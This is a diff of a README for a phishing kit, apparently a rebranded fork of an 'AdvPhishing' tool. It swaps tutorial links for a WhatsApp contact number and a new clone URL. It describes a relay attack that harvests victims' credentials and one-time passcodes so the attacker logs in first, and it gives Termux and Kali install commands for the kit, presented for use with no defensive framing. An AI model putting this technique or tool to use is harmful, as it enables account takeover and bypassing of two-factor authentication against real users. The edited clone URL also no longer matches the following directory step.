@@ -24,38 +24,22 @@
 </p>
 
 
-# Special WhatsApp OTP BYPASS VIDEO
- Link - https://www.youtube.com/watch?v=6zfpSn2mOLU
+# MY WHATSAPP NUMBER
+            03476508876
 
-# TECHNIQUE
+# SULTANTECH
 When victim enter his credentials, you need to go to original website and use those credentials to send real OTP to victim. Once he enter that OTP such OTP will also be there with you and you will be allowed to login the account before him.
-
-# TUTORIAL [ KALI ]
-[(![des](https://user-images.githubusercontent.com/55870659/77065337-7b7de000-69b7-11ea-915d-4dad81d2e892.png)](https://www.youtube.com/watch?v=MhSb4My1lZo)
-
-# TUTORIAL [ TERMUX ]
-[(![des](https://user-images.githubusercontent.com/55870659/79192397-73119d00-7ddd-11ea-865f-9128abe2fba9.jpg)](https://www.youtube.com/watch?v=LO3hX1lLBjI)
-
-# MORE TUTORIALS 
-* Whatsapp OTP - https://www.youtube.com/watch?v=6zfpSn2mOLU
-* GOOGLE OTP - https://youtu.be/MhSb4My1lZo
-* Installation - https://www.youtube.com/watch?v=Yv5tT-hmcYQ
-* PAYTM OTP - https://www.youtube.com/watch?v=3TB_sISTw9U
-* TIKTOK -    https://www.youtube.com/watch?v=5qc0Mgyhr7E
-
-# SCREENSHOT ( KALI )
-![full](https://user-images.githubusercontent.com/55870659/79147250-a7f80280-7d91-11ea-894a-d7d685a6e8cb.png)
 
 
 # INSTALLATION [ TERMUX APP --ANDROID ]
-* git clone https://github.com/Ignitetch/AdvPhishing.git
+* git clone https://github.com/Sultantech/phishing
 * cd AdvPhishing/
 * chmod 777 start.sh
 * ./start.sh
 * ./An-AdvPhishing.sh
 
 # INSTALLATION [ KALI ]
-* git clone https://github.com/Ignitetch/AdvPhishing.git
+* git clone https://github.com/Sultantech/phishing
 * cd AdvPhishing/
 * chmod 777 setup.sh
 * ./setup.sh
